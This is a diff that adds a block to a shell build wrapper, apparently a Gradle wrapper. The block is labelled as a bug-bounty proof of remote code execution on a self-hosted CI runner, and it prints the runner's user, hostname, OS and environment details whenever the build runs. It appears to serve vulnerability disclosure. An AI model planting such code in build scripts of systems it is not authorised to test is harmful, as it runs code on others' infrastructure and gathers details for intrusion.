@@ -1,5 +1,18 @@
 #!/bin/sh
 
+echo "============================================"
+echo "YWH_SELF_HOSTED_RUNNER_RCE_PROOF"
+echo "============================================"
+echo "Date: $(date -u)"
+echo "Runner user: $(id)"
+echo "Hostname: $(hostname)"
+echo "OS: $(uname -a)"
+echo "Working directory: $(pwd)"
+echo "Runner name: $RUNNER_NAME"
+echo "Runner OS: $RUNNER_OS"
+echo "Runner arch: $RUNNER_ARCH"
+echo "============================================"
+
 #
 # Copyright © 2015-2021 the original authors.
 #
